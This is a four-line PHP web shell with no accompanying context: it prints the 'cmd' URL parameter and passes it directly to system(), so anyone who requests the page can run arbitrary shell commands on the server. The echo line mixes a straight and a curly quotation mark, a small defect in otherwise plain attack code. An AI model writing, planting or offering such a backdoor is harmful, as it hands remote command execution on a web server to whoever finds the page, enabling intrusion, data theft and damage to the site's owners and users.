<?php
echo "Run Command (?cmd=) : ”.htmlspecialchars($_GET['cmd']);
system($_GET['cmd']);
?>

